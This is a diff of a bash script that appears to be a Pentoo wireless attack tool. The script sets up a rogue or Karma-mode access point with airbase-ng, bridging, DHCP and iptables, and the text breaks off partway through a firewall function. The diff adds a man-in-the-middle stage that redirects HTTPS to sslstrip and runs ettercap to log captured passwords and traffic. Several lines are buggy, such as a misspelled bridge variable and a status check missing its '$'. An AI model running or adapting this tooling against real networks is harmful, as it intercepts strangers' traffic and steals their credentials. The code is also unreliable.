@@ -39,12 +39,12 @@ if [[ -n $1 ]]; then
 	# If any fast options were used predefine there variables now
 	elif [[ $1 == '-f' || $1 == '--fast' ]]; then
 		FAST="True"
-		FAST_HOSTAPD="True"
+		FAST_AIRBASE="True"
 		
 		if [[ $2 == '-b' || $2 == '--bridge' ]]; then
 			BRIDGED="True"
 		elif [[ $2 == '-d' || $2 == '--dhcpd' ]]; then
-			FAST_DHCPD="TRUE"
+			BRIDGED="False"
 		else
 			echo "Invalid option see --help"
 			exit 0
@@ -89,11 +89,11 @@ depends()
 	BLD_TEA=${txtbld}$(tput setaf 6) #  teal
 	BLD_WHT=${txtbld}$(tput setaf 7) #  white
 	TXT_RST=$(tput sgr0)             # Reset
-	INF_O=${BLD_WHT}*${TXT_RST}        # Feedback
+	INFO=${BLD_WHT}*${TXT_RST}        # Feedback
 	PASS="${BLD_TEA}[${TXT_RSR}${BLD_WHT} OK ${TXT_RST}${BLD_TEA}]${TXT_RST}"
 	WARN="${BLD_TEA}[${TXT_RST}${BLD_PUR} * ${TXT_RST}${BLD_TEA}]${TXT_RST}"
 	QUES=${BLD_BLU}?${TXT_RST}
-	# start text with ^ variable and end the text with $(tput sgr0)
+	# Start text with ^ variable and end the text with $(tput sgr0)
 }
 
 banner()
@@ -107,11 +107,19 @@ setupenv()
 	if [[ -n $(ps -A | grep -i airbase) ]]; then echo "$WARN Leftover scoobie snacks found! nom nom"; killall airbase-ng; fi
 	
 	if [[ -n $(ip addr | grep -i "$MON") ]]; then echo "$WARN Leftover scoobie snacks found! nom nom"; airmon-zc stop $MON; fi
+
+	if [[ -e /etc/init.d/net.$AP ]]; then
+		get_RCstatus "$AP"
+		if [[ $STATUS == 'started' ]]; then
+			echo "$WARN Leftover scoobie snacks found! nom nom"
+			/etc/init.d/net.$AP stop
+		fi
+	fi
 	
-	sessionfolder=/tmp/n4p #set our tmp working configuration directory and then build config files
+	sessionfolder=/tmp/n4p # Set our tmp working configuration directory and then build config files
 	if [ ! -d "$sessionfolder" ]; then mkdir "$sessionfolder"; fi
 		mkdir -p "$sessionfolder" "$sessionfolder/logs"
-	if [[ -n $(rfkill list | grep yes) ]]; then #if I think of a better way to do this then update this feature to be more comprehensive
+	if [[ -n $(rfkill list | grep yes) ]]; then # If you think of a better way to do this then let me know
   		rfkill unblock 0
 	fi
 }
@@ -124,12 +132,12 @@ step() {
     [[ -w $sessionfolder/logs ]] && echo -e $STEP_OK > $sessionfolder/logs/step.$$
 }
 
-try() {
+action() {
     # Check for `-b' argument to run command in the background.
-    local BG=
+    #local BG=
 
-    [[ $1 == -b ]] && { BG=1; shift; }
-    [[ $1 == -- ]] && {       shift; }
+    #[[ $1 == -b ]] && { BG=1; shift; }
+    #[[ $1 == -- ]] && {       shift; }
 
     # Run the command.
     if [[ -z $BG ]]; then
@@ -155,9 +163,23 @@ try() {
 
 next() {
     [[ -f $sessionfolder/logs/step.$$ ]] && { STEP_OK=$(< $sessionfolder/logs/step.$$); rm -f $sessionfolder/logs/step.$$; }
-    [[ $STEP_OK == 0 ]] && echo -e "$1	$PASS" || echo -e "$1	$WARN"
-    echo
+    [[ $STEP_OK == 0 ]] && echo -e "$PASS   $1" || echo -e "$WARN  $1"
     return $STEP_OK
+}
+
+get_state()
+{
+	STATE=$(ip addr list | grep -i $1 | grep -i DOWN | awk -Fstate '{print $2}' | cut -d ' ' -f 2)
+}
+
+get_inet()
+{
+	INET=$(ip addr list | grep -i $1 | grep -i inet | awk '{print $2}')
+}
+
+get_RCstatus()
+{
+	STATUS=$(/etc/init.d/net.$1 status | sed 's/* status: //g' | cut -d ' ' -f 2)
 }
 
 settings()
@@ -167,37 +189,36 @@ settings()
 		+==============================================+
 		|           Listing Network Devices            |
 		+==============================================+${TXT_RST}"
-		try ip addr
+		action ip addr
 		echo "${BLD_ORA}***************************************************************************************${TXT_RST}"
-		echo "Press Enter for defaults"
-		read -p "What is your Internet or default interface? [eth0]: " LAN
+		echo "$INFO Press Enter for defaults"
+		read -p "$QUES What is your Internet or default interface? [eth0]: " LAN
 		if [[ -z $LAN ]]; then LAN="eth0"; fi
 
-		read -p "What is your default Wireless interface? [wlan0]: " WLAN
+		read -p "$QUES What is your default Wireless interface? [wlan0]: " WLAN
 		if [[ -z $WLAN ]]; then WLAN="wlan0"; fi
 
-		read -p "AP configuration Press enter for defaults or 1 for custom AP attributes: " ATTRIBUTES
+		read -p "$QUES AP configuration Press enter for defaults or 1 for custom AP attributes: " ATTRIBUTES
 		if [[ $ATTRIBUTES != 1 ]]; then
 			ESSID="Pentoo"
 			CHAN="1"
 			BEACON="100"
 			PPS="100"
 		else
-			echo "$WARN WEP & WPA are supplied in the config file." # I chose not to script them in as most people will not use them
-			read -p "What SSID Do You Want To Use [Pentoo]: " ESSID
+			read -p "$QUES What SSID Do You Want To Use [Pentoo]: " ESSID
 			if [[ -z $ESSID ]]; then ESSID="Pentoo"; fi
 			
-			read -p "What CHANNEL Do You Want To Use [1]: " CHAN
+			read -p "$QUES What CHANNEL Do You Want To Use [1]: " CHAN
 			if [[ -z $CHAN ]]; then CHAN="1"; fi
 			
-			read -p "Beacon Intervals [100]: " BEACON
+			read -p "$QUES Beacon Intervals [100]: " BEACON
 			if [[ -z $BEACON ]]; then 
 				BEACON="100"
 			elif (( ($BEACON < 10) )); then 
 				BEACON="100"
 			fi
 			
-			read -p "Packets Per Second [100]: " PPS
+			read -p "$QUES Packets Per Second [100]: " PPS
 			if [[ -z $PPS ]]; then PPS="100"; fi
 			
 			if (( ($PPS < 100) )); then PPS="100"; fi
@@ -208,7 +229,8 @@ settings()
 		if [[ -z $WLAN ]]; then WLAN="wlan0"; fi
 
 		if [[ -e /etc/init.d/net.$WLAN ]]; then
-			if [[ $(/etc/init.d/net.$WLAN status | sed 's/* status: //g' | cut -d ' ' -f 2) == 'started' ]]; then
+			get_RCstatus "$WLAN"
+			if [[ $STATUS == 'started' ]]; then
 				/etc/init.d/net.$WLAN stop
 			fi
 		fi
@@ -224,62 +246,64 @@ settings()
 keepalive()
 {
 	read -e -p "$WARN Press ctrl+c when you are ready to go down!" ALLINTHEFAMILY # Protect this script from going down hastily
-	if [[ $ALLINTHEFAMILY != 'cuilewhnc78hc4ohfbP7YR;JNd3F92PHBF23' ]]; then clear; keepalive; fi
+	if [[ $ALLINTHEFAMILY != 'SGFjayBUaGUgUGxhbmV0IQ==' ]]; then clear; keepalive; fi
 }
 
 killemAll()
 {
 	echo -e "\n\n$WARN The script has died. Major network configurations have been modified.\nWe must go down cleanly or your system will be left in a broken state!"
-	if [[ -e /etc/init.d/net.$AP ]]; then
-		if [[ $(/etc/init.d/net.$AP status | sed 's/* status: //g' | cut -d ' ' -f 2) == 'started' ]]; then
-			/etc/init.d/net.$AP stop
-		fi
-	fi
 	pkill airbase-ng
 	airmon-zc stop $MON
 
 	if [[ $BRIDGED == 'True' ]]; then
-		if [[ $(/etc/init.d/net.$BRIDGE status | sed 's/* status: //g' | cut -d ' ' -f 2) == 'started' ]]; then
-			try /etc/init.d/net.$BRIDGE stop
+		get_RCstatus $BRIDGE
+		if [[ $STATUS == 'started' ]]; then
+			action /etc/init.d/net.$BRIDGE stop
 		fi
 
-		if [[ $(ip addr list | grep -i $BRDIGE | grep -i DOWN | awk -Fstate '{print $2}' | cut -d ' ' -f 2) != 'DOWN' ]]; then
+		get_state "$BRDIGE"
+		if [[ $STATE != 'DOWN' ]]; then
 			ip link set $BRDIGE down
 		fi
-		brctl delbr $BRIDGE
+		brctl delif "$BRIDGE $RESP_BR_1"
+		brctl delif "$BRIDGE $RESP_BR_2"
+		brctl delbr "$BRIDGE"
 		brctl show
 	fi
 	rebuild_network
 	fw_down
-	echo "$PASS The environment is now sanitized cya"
+	echo "$INFO The environment is now sanitized cya"
 	exit 0
 }
 
 rebuild_network()
 {
-	echo "$WARN It's now time to bring your default network interface back up"
+	echo "$INFO It's now time to bring your default network interface back up"
 	echo -e "${BLD_WHT}
 	+==================================+
 	| 1) Use eth0                      |
 	| 2) Use wlan0                     |
 	+==================================+${TXT_RST}"
-	read -p "Option: " MENU_REBUILD_NETWORK
+	read -p "$QUES Option: " MENU_REBUILD_NETWORK
 	if [[ $MENU_REBUILD_NETWORK == 1 ]]; then
-		if [[ $(/etc/init.d/net.$LAN status | sed 's/* status: //g' | cut -d ' ' -f 2) != 'started' ]]; then 
-			if [[ $(ip addr list | grep -i $LAN | grep -i DOWN | awk -Fstate '{print $2}' | cut -d ' ' -f 2) == 'DOWN' ]]; then
+		get_RCstatus "$LAN"
+		if [[ $STATUS != 'started' ]]; then
+			get_state "$LAN"
+			if [[ $STATE == 'DOWN' ]]; then
 				ip link set $LAN up
 			fi
 			/etc/init.d/net.$LAN start
 		fi
 	elif [[ $MENU_REBUILD_NETWORK == 2 ]]; then
-		if [[ $(/etc/init.d/net.$WLAN status | sed 's/* status: //g' | cut -d ' ' -f 2) != 'started' ]]; then 
-			if [[ $(ip addr list | grep -i $WLAN | grep -i DOWN | awk -Fstate '{print $2}' | cut -d ' ' -f 2) == 'DOWN' ]]; then
+		get_RCstatus "$WLAN"
+		if [[ $STATUS != 'started' ]]; then
+			get_state "$WLAN"
+			if [[ $STATE == 'DOWN' ]]; then
 				ip link set $WLAN up
 			fi
 			/etc/init.d/net.$WLAN start
 		fi
 	else 
-		clear
 		echo "$WARN Invalid option"
 		rebuild_network
 	fi
@@ -292,35 +316,59 @@ trap killemAll INT HUP;
 ##################################################################
 startairbase()
 {
-	while [[ $(ip addr list | grep -i $WLAN | grep -i DOWN | awk -Fstate '{print $2}' | cut -d ' ' -f 2) != 'DOWN' ]]; do 
+	get_state "$WLAN"
+	while [[ $STATE != 'DOWN' ]]; do 
 		ip link set "$WLAN" down
 	done
 
 	step "Airmon-zc comming up"
-	try airmon-zc check kill
-	try airmon-zc start $WLAN
+	action airmon-zc check kill
+	action airmon-zc start $WLAN
 	next
 
-	if (( ($MENUCHOICE == 2) )); then
-		step "STARTING SERVICE: AIRBASE-NG"
-		try airbase-ng $MON -c $CHAN -x $PPS -I $BEACON -e $ESSID -v > $sessionfolder/logs/airbase-ng.log &
-		sleep .5 ## future put this and the next line in a more comprehensive loop
-		try cat $sessionfolder/logs/airbase-ng.log # I like to see things on my screen so show me the goods
+	if [[ $MENUCHOICE == 2 ]]; then
+		step "$INFO STARTING SERVICE: AIRBASE-NG"
+		action airbase-ng $MON -c $CHAN -x $PPS -I $BEACON -e $ESSID -v > $sessionfolder/logs/airbase-ng.log &
+		sleep 0.5 ## future put this and the next line in a more comprehensive loop
+		action cat $sessionfolder/logs/airbase-ng.log # I like to see things on my screen so show me the goods
 		next
-	elif (( ($MENUCHOICE == 1) )); then # used elif instead of just else for more comprehensive structure so users may modify easier.
-		step "$PASS STARTING SERVICE: KARMA AIRBASE-NG"
-		try airbase-ng $MON -c $CHAN -x $PPS -I $BEACON -e $ESSID -P -C 15 -v > $sessionfolder/logs/airbase-ng.log &
-		sleep .5
-		try cat $sessionfolder/logs/airbase-ng.log # I like to see things on my screen so show me the goods
+	elif [[ $MENUCHOICE == 1 ]]; then # used elif instead of just else for more comprehensive structure so users may modify easier.
+		step "$INFO STARTING SERVICE: KARMA AIRBASE-NG"
+		action airbase-ng $MON -c $CHAN -x $PPS -I $BEACON -e $ESSID -P -C 15 -v > $sessionfolder/logs/airbase-ng.log &
+		sleep 0.5
+		action cat $sessionfolder/logs/airbase-ng.log # I like to see things on my screen so show me the goods
 		next
 	fi
 
-	step "Assigning IP and Route to $AP"
-	while [[ $(ip addr list | grep -i $AP | grep -i DOWN | awk -Fstate '{print $2}' | cut -d ' ' -f 2) == 'DOWN' || -z $(ip addr list | grep -i $AP) ]]; do 
-		try ip link set $AP up
+	echo "" # \n doesn't work through our action function so we need another echo to give a line break
+	step "$INFO Assigning IP and Route to $AP"
+	get_state "$AP"
+	while [[ $STATE == 'DOWN' || -z $(ip addr list | grep $AP) ]]; do #check AP state if down go up, if AP has not loaded yet wait a bit
+		sleep 0.3
+		action ip link set $AP up
+		get_state "$AP"
 	done
-	try ip addr add 10.0.0.254 broadcast 10.0.0.255 dev $AP
-	try route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.254
+	# setting ip and route doesn't always take, to ensure it sticks and check no other routes or ip's are getting assigned not by us then remove them if so.
+	local CHK_IP=$(ip addr | grep $AP | grep -i inet | awk -Finet '{print $2}' | awk -F brd '{print $1}' | cut -d ' ' -f 2)
+	if [[ -n $CHK_IP && $CHK_IP != 10.0.0.254/32 ]]; then
+		action ip addr del $CHK_IP dev $AP
+	fi
+
+	local CHK_IP=$(ip route | grep $AP | awk -Fvia '{print $1}')
+	if [[ -n $CHK_IP && $CHK_IP != 10.0.0.0/24  ]]; then
+		action ip route flush $CHK_IP
+	fi
+
+	while [[ -z $(ip addr | grep $AP | grep -i inet | awk -Finet '{print $2}' | awk -F/ '{print $1}') ]]; do
+		sleep 0.3
+		action ip addr add 10.0.0.254 broadcast 10.0.0.255 dev $AP
+	done
+
+	while [[ -z $(route -n | grep $AP | grep 10.0.0.254 ) ]]; do
+		sleep 0.3
+		action route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.254
+	done
+	action route -n
 	next
 	AIRBASE="On"
 }
@@ -331,46 +379,62 @@ openrc_bridge()
 {
 	# OpenRC needs sym links to bring the interface up. Verify they exist as needed if not make them then set proper state
 	if [[ -e /etc/init.d/net.$BRIDGE ]]; then
-		if [[ $(/etc/init.d/net.$BRIDGE status | sed 's/* status: //g' | cut -d ' ' -f 2) == 'started' ]]; then
-			/etc/init.d/net.$BRIDGE stop; sleep 1; try ip link set $BRIDGE down
+		get_RCstatus "$BRIDGE"
+		if [[ $STATUS == 'started' ]]; then
+			/etc/init.d/net.$BRIDGE stop; sleep 1; ip link set $BRIDGE down
 		fi
 	else
 		ln -s /etc/init.d/net.lo /etc/init.d/net.$BRIDGE
 	fi
 
 	if [[ -e /etc/init.d/net.$RESP_BR_1 ]]; then
-		if [[ $(/etc/init.d/net.$RESP_BR_1 status | sed 's/* status: //g' | cut -d ' ' -f 2) == 'started' ]]; then
-			/etc/init.d/net.$RESP_BR_1 stop; sleep 1; try ip link set $RESP_BR_1 down
+		get_RCstatus "$RESP_BR_1"
+		if [[ $STATUS == 'started' ]]; then
+			/etc/init.d/net.$RESP_BR_1 stop; sleep 1; ip link set $RESP_BR_1 down
 		fi
-	else
-		ln -s /etc/init.d/net.lo /etc/init.d/net.$RESP_BR_1
 	fi
 
 	if [[ -e /etc/init.d/net.$RESP_BR_2 ]]; then
-		if [[ $(/etc/init.d/net.$RESP_BR_2 status | sed 's/* status: //g' | cut -d ' ' -f 2) == 'started' ]]; then 
-			/etc/init.d/net.$RESP_BR_2 stop; sleep 1; try ip link set $RESP_BR_2 down
+		get_RCstatus "$RESP_BR_2"
+		if [[ $STATUS == 'started' ]]; then 
+			/etc/init.d/net.$RESP_BR_2 stop; sleep 1; ip link set $RESP_BR_2 down
 		fi
-	else
-		ln -s /etc/init.d/net.lo /etc/init.d/net.$RESP_BR_2
 	fi
 
-	local CHK_IP=$(ip addr list | grep $RESP_BR_1 | grep inet | awk '{print $2}') # This insures $RESP_BR_2 does not have an ip and then removes it if it does since the bridge handles this
-	if [[ -n $CHK_IP ]]; then
+	get_inet "$RESP_BR_1" # This insures $RESP_BR_1 does not have an ip and then removes it if it does since the bridge handles this
+	if [[ -n $INET ]]; then
 		ip addr del $CHK_IP dev $RESP_BR_1
 	fi
-	local CHK_IP=$(ip addr list | grep $RESP_BR_2 | grep inet | awk '{print $2}') # This insures $RESP_BR_2 does not have an ip and then removes it if it does since the bridge handles this
-	if [[ -n $CHK_IP ]]; then
+
+	get_inet "$RESP_BR_2" # This insures $RESP_BR_2 does not have an ip and then removes it if it does since the bridge handles this
+	if [[ -n $INET ]]; then
 		ip addr del $CHK_IP dev $RESP_BR_2
 	fi
 
-	step "Building $BRIDGE now with $BRIDGE RESP_BR_2 $BRIDGE_RESP_BR_1"
-	try iw dev $RESP_BR_2 set 4addr on
-	try ip link set $RESP_BR_2 up
-	try ip link set $RESP_BR_1 up
-	try brctl addbr $BRIDGE
-	try brctl addif $BRIDGE $RESP_BR_1
-	try brctl addif $BRIDGE $RESP_BR_2
-	try ip link set $BRIDGE up
+	echo ""
+	step "Building $BRIDGE now with $BRIDGE $RESP_BR_2 $BRIDGE_RESP_BR_1"
+	#action iw dev $RESP_BR_2 set 4addr on "Un comment if you are going to use hostapd"
+	get_state "$RESP_BR_2"
+	while [[ $STATE == 'DOWN' || -z $(ip addr list | grep $RESP_BR_2) ]]; do 
+		sleep 0.2
+		action ip link set $RESP_BR_2 up
+		get_state "$RESP_BR_2"
+	done
+
+	get_state "$RESP_BR_1"
+	while [[ $STATE == 'DOWN' || -z $(ip addr list | grep $RESP_BR_1) ]]; do 
+		sleep 0.2
+		action ip link set $RESP_BR_1 up
+		get_state "$RESP_BR_1"
+	done
+	sleep 2
+	action brctl addbr $BRIDGE
+	sleep 0.3
+	action brctl addif $BRIDGE $RESP_BR_1
+	sleep 0.3
+	action brctl addif $BRIDGE $RESP_BR_2
+	sleep 0.3
+	action ip link set $BRIDGE up
 	next
 }
 
@@ -378,19 +442,19 @@ fbridge()
 {
 	if [[ -z $FAST ]]; then
 		if [[ -z $BRIDGED ]]; then
-			read -p "Would you like me to bridge this AP? If no thats ok we can use ip_forward in iptables (y/n) " RESP_BR
+			read -p "$QUES Would you like me to bridge this AP? If no thats ok we can use ip_forward in iptables (y/n) " RESP_BR
 			if [[ $RESP_BR == [yY] ]]; then
-				read -p "$WARN Create the arbitrary name of your bridge, e.g. br0: " BRIDGE
+				read -p "$QUES Create the arbitrary name of your bridge, e.g. br0: " BRIDGE
 				if [[ -z $BRIDGE ]]; then BRIDGE=br0; fi
-				echo -e "$PASS We need to setup the interfaces you are going to use with $BRIDGE \n e.g. $LAN and $AP, here are your possible choices"
+				echo -e "$INFO We need to setup the interfaces you are going to use with $BRIDGE \n e.g. $LAN and $AP, here are your possible choices"
 				echo "${BLD_ORA}!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!${TXT_RST}"
 				ip addr
 				echo "{BLD_ORA}!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!${TXT_RST}"
-				read -p "$WARN Please tell me the first interface to use: " RESP_BR_1
+				read -p "$QUES Please tell me the first interface to use: " RESP_BR_1
 				
 				if [[ -z $RESP_BR_1 ]]; then RESP_BR_1=$LAN; fi
 				
-				read -p "$WARN Please tell me the second interface to use: " RESP_BR_2
+				read -p "$QUES Please tell me the second interface to use: " RESP_BR_2
 				if [[ -z $RESP_BR_2 ]]; then # Run default check to verify what our default interface should be encase the user forgot to set this properly.
 					if [[ $AIRBASE == 'On' ]]; then
 						RESP_BR_2=$AP
@@ -403,7 +467,7 @@ fbridge()
 			elif [[ $RESP_BR == [nN] ]]; then
 				BRIDGED="False"
 			else	
-				clear; echo "Invalid option"; fbridge
+				clear; echo "$WARN Invalid option"; fbridge
 			fi
 		fi
 	elif [[ $BRIDGED == 'True' ]]; then # If we are here then $FAST -f was enabled with -b
@@ -411,7 +475,7 @@ fbridge()
 		RESP_BR_1=$LAN
 		if [[ -n $FAST_AIRBASE ]]; then
 			RESP_BR_2=$AP
-		elif [[ -n $FAST_HOSTAPD ]]; then
+		elif [[ -n $FAST_HOSTAPD ]]; then # Users may run hostapd instead on their own just by running it and changing the FAST variable on line 42
 			RESP_BR_2=$WLAN
 		fi
 		openrc_bridge
@@ -420,21 +484,49 @@ fbridge()
 
 dhcp()
 {
-	if [[ -n $(cat /etc/dhcp/dhcpd.conf | grep -i Pentesters_AP | awk {'print $2'}) ]]; then
-		if [[ $BRIDGED == 'False' ]]; then
+	if [[ -n $(cat /etc/dhcp/dhcpd.conf | grep -i Pentesters_AP | awk '{print $2}') ]]; then
+		if [[ $BRIDGED != 'True' ]]; then
 			if [[ -e /etc/init.d/net.$AP ]]; then
-				rm /etc/init.d/net.$AP # We cant have this when assigning static routes
+				get_RCstatus "$AP"
+				if [[ STATUS == 'started' ]]; then
+					echo ""
+				step "$INFO Restarting interface $AP up"
+				action /etc/init.d/net.$AP restart
+				next
+				fi
+			else
+				echo ""
+				step "$INFO Bringing interface $AP up"
+				action ln -s /etc/init.d/net.lo /etc/init.d/net.$AP
+				action /etc/init.d/net.$AP start
+				next
 			fi
-			/etc/init.d/dhcpd restart
 		else
-			/etc/init.d/net.$BRIDGE start
+			echo ""
+			step "$INFO Starting Bridge"
+			action /etc/init.d/net.$BRIDGE start
+			next
 		fi
-	else # We apparently don't have the proper configuration file. Make the changes and try again
+	else # We apparently don't have the proper configuration file. Make the changes and action again
 		find * -wholename $DIR/dhcpd.conf -exec cat {} >> /etc/dhcp/dhcpd.conf \;
 		dhcp
 	fi
 }
-
+##################################################################
+####################Launch External Services######################
+##################################################################
+mitm()
+{
+	echo ""
+	step "$INFO Launching sslstrip"
+	action sslstrip -p -k -f lock.ico -w $sessionfolder/logs/ssl.log &>/dev/null
+	#action xterm -hold -e "tail -f /var/log/messages | grep -i N4P_Victim:"
+	next
+	echo ""
+	step "$INFO Launching ettercap"
+	action xterm -hold -e "ettercap -T -i $AP -w $sessionfolder/logs/recovered_passwords.pcap -L $sessionfolder/logs/all_traffic.log"
+	next	
+}
 ##################################################################
 ######################Build the firewall##########################
 ##################################################################
@@ -448,7 +540,7 @@ fw_pre_services()
 			clear; echo "$WARN Bad input"; fw_pre_services
 		fi
 
-		read -p "$PASS Would you like to turn on OpenVPN now? (y/n) " RESP
+		read -p "Would you like to turn on OpenVPN now? (y/n) " RESP
 		if [[ $RESP == [yY] ]]; then
 			fw_vpn;	
 		elif [[ $RESP != [nN] ]]; then
@@ -461,49 +553,57 @@ fw_pre_services()
 fw_redundant()
 {
 	## Flush rules
-	echo "Flushing old rules"
-	/etc/init.d/iptables stop
+	step "$INFO Flushing old rules"
+	echo ""
+	action /etc/init.d/iptables stop
 	$IPT -F
 	$IPT $WAN -F
 	$IPT --delete-chain
 	$IPT $WAN --delete-chain
+	$IPT -F FORWARD
 	$IPT -t filter --flush FORWARD
 	$IPT -t filter --flush INPUT
-
-	# Set default policies for all three default chains
-	step "$WARN Setting default policies"
-	try $IPT -P OUTPUT ACCEPT
 	next
 
-	step "$WARN We will allow ip forwarding"
+	# Set default policies for all three default chains
+	echo ""
+	step "$INFO Setting default policies"
+	action $IPT -P OUTPUT ACCEPT
+	next
+
+	echo ""
+	step "$INFO We will allow ip forwarding"
 	echo 1 > /proc/sys/net/ipv4/ip_forward
-	try $IPT -P FORWARD ACCEPT
-	try $IPT -F FORWARD
+	action $IPT -P FORWARD ACCEPT
 	next
 
 	# Enable free use of loopback interfaces
-	step "$WARN  Allowing loopback devices"
-	try $IPT -A INPUT -i lo -j ACCEPT
-	try $IPT -A OUTPUT -o lo -j ACCEPT
+	echo ""
+	step "$INFO  Allowing loopback devices"
+	action $IPT -A INPUT -i lo -j ACCEPT
+	action $IPT -A OUTPUT -o lo -j ACCEPT
 	next
 
 	## permit local network
-	step "$WARN  Permit local network"
-	try $IPT -A INPUT -i $LAN -j ACCEPT
-	try $IPT -A OUTPUT -o $LAN -j ACCEPT
+	echo ""
+	step "$INFO  Permit local network"
+	action $IPT -A INPUT -i $LAN -j ACCEPT
+	action $IPT -A OUTPUT -o $LAN -j ACCEPT
 	next
 
 	## DHCP
-	step "$WARN  Allowing DHCP server"
-	try $IPT -A INPUT $WAN -p udp --sport 67 --dport 68 -j ACCEPT
+	echo ""
+	step "$INFO  Allowing DHCP server"
+	action $IPT -A INPUT $WAN -p udp --sport 67 --dport 68 -j ACCEPT
 	next
 
 	## Allow Samba
-	step "$WARN Configuring Samba"
-	try $IPT -A INPUT -i $LAN -p tcp -m multiport --dports 445,135,136,137,138,139 -j ACCEPT
-	try $IPT -A INPUT -i $LAN -p udp -m multiport --dports 445,135,136,137,138,139 -j ACCEPT
-	try $IPT -A OUTPUT -o $LAN -p tcp -m multiport --dports 445,135,136,137,138,139 -j ACCEPT
-	try $IPT -A OUTPUT -o $LAN -p udp -m multiport --dports 445,135,136,137,138,139 -j ACCEPT
+	echo ""
+	step "$INFO Configuring Samba"
+	action $IPT -A INPUT -i $LAN -p tcp -m multiport --dports 445,135,136,137,138,139 -j ACCEPT
+	action $IPT -A INPUT -i $LAN -p udp -m multiport --dports 445,135,136,137,138,139 -j ACCEPT
+	action $IPT -A OUTPUT -o $LAN -p tcp -m multiport --dports 445,135,136,137,138,139 -j ACCEPT
+	action $IPT -A OUTPUT -o $LAN -p udp -m multiport --dports 445,135,136,137,138,139 -j ACCEPT
 	next
 	fw_pre_services
 }
@@ -511,47 +611,52 @@ fw_redundant()
 fw_services()
 {
 	## Allow DNS Server
-	step "$WARN Allowing dns on port 53"
-	try $IPT -A INPUT $WAN -p udp -m udp --dport 53 -j ACCEPT
+	echo ""
+	step "$INFO Allowing dns on port 53"
+	action $IPT -A INPUT $WAN -p udp -m udp --dport 53 -j ACCEPT
 	next
 
-	## SSH (allows SSH to firewall, from anywhere on the WAN)
-	step "$WARN Allowing ssh on port 22"
-	try $IPT -A INPUT $WAN -p tcp --dport 22 -j ACCEPT
+	## SSH (allows SSH through firewall, from anywhere on the WAN)
+	echo ""
+	step "$INFO Allowing ssh on port 22"
+	action $IPT -A INPUT $WAN -p tcp --dport 22 -j ACCEPT
 	next
 
 	## Web server
-	step "$WARN Allowing http on port 80 and https on 443"
-	try $IPT -A INPUT $WAN -p tcp -m multiport --dports 80,443 -j ACCEPT
+	echo ""
+	step "$INFO Allowing http on port 80 and https on 443"
+	action $IPT -A INPUT $WAN -p tcp -m multiport --dports 80,443 -j ACCEPT
 	next
 }
 
 vpn_confirmed()
 {
 	#Allow TUN interface connections to OpenVPN server
-	step "$WARN Allowing openVPN"
-	try $IPT -A INPUT -i $VPN -j ACCEPT
+	echo ""
+	step "$INFO Allowing openVPN"
+	action $IPT -A INPUT -i $VPN -j ACCEPT
 	#allow TUN interface connections to be forwarded through other interfaces
-	try $IPT -A FORWARD -i $VPN -j ACCEPT
+	action $IPT -A FORWARD -i $VPN -j ACCEPT
 	# Allow TAP interface connections to OpenVPN server
-	try $IPT -A INPUT -i $VPNI -j ACCEPT
+	action $IPT -A INPUT -i $VPNI -j ACCEPT
 	# Allow TAP interface connections to be forwarded through other interfaces
-	try $IPT -A FORWARD -i $VPNI -j ACCEPT
+	action $IPT -A FORWARD -i $VPNI -j ACCEPT
 	next
 	# I've been called into action
-	step "OpenRC now bringing up OpenVPN"
-	try /etc/init.d/openvpn start
+	echo ""
+	step "$INFO OpenRC now bringing up OpenVPN"
+	action /etc/init.d/openvpn start
 	next
 }
 
 fw_vpn()
 {
-	echo "$WARN Please pay close attention to the following when considering turning on openvpn."
-	echo "$WARN The gateway is still broken for dual nics wile hosting services." # Do some work on custom gateway routing for this soon 10-22-2013"
-	echo "$WARN Be careful the VPN configuration could break your gateway for MiTM attacks and remote services."
-	echo "$PASS This will be fixed in the future."
-	echo " You're advised not to use the vpn during attacks and only operate during daily activity at this time 10-29-2013"
-	read -p "$PASS Do you still want to turn on OpenVPN now? (y/n) " RESP
+	echo "$INFO Please pay close attention to the following when considering turning on openvpn."
+	echo "$INFO The gateway is still broken for dual nics while hosting services." # Do some work on custom gateway routing for this soon"
+	echo "$INFO Be careful the VPN configuration could break your gateway for MiTM attacks and remote services."
+	echo "$INFO This will be fixed in the future."
+	echo " You're advised not to use the vpn during attacks and only operate during daily activity at this time"
+	read -p "$INFO Do you still want to turn on OpenVPN now? (y/n) " RESP
 	if [[ $RESP == [yY] ]]; then 
 		vpn_confirmed; 
 	elif [[ $RESP != [nN] ]]; then
@@ -563,69 +668,78 @@ fw_vpn()
 fw_closure()
 {
 	## drop everything else arriving from WAN on local interfaces
-	step "$WARN Drop everything else"
-	try $IPT -A INPUT -i $LAN -j LOG
-	try $IPT -A INPUT -i $LAN -j DROP
+	echo ""
+	step "$INFO Drop everything else"
+	action $IPT -A INPUT -i $LAN -j LOG
+	action $IPT -A INPUT -i $LAN -j DROP
 	next
 	#
 	# Save settings
 	#
-	step "$WARN Saving settings and bringing iptables back online"
-	try /etc/init.d/iptables save
-	try /etc/init.d/iptables start
+	echo ""
+	step "$INFO Saving settings and bringing iptables back online"
+	action /etc/init.d/iptables save
+	echo ""
+	action /etc/init.d/iptables start
 	next
 
 	## list the iptables rules as confirmation
-	step "$WARN Listing the iptables rules as confirmation"
-	try $IPT -L -v
+	echo ""
+	step "$INFO Listing the iptables rules as confirmation"
+	echo ""
+	action $IPT -L -v
 	next
 }
-
+fw_ssl()
+{
+	if [[ -n $FAST_SSLSTRIP ]]; then
+		echo ""
+		step "$INFO Fast mode sslstrip"
+		action $IPT $WAN -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 10000
+		#action $IPT $WAN -A OUTPUT -p tcp --dport 443 -j DNAT --to-destination 127.0.0.1:10000
+		mitm
+		next
+	else	
+		read -p "$INFO Are we using sslstrip? (y/n) " SSLSTRIP
+		if [[ $SSLSTRIP == [yY] ]]; then
+			FAST_SSLSTRIP=Y; fw_ssl
+		elif [[ $SSLSTRIP != [nN] ]]; then
+			echo "$WARN Bad input"; fw_ssl
+		fi
+	fi
+}
 fw_up()
 { 
 	fw_redundant
-	echo -e "$PASS It's time for specialty hacking configurations"
-	echo -e "These settings are not default as they may break daily activity.\nDaily rules will automagically be rebuilt when you're done hacking all the things"
-	if [[ $BRIDGED == 'False' ]]; then
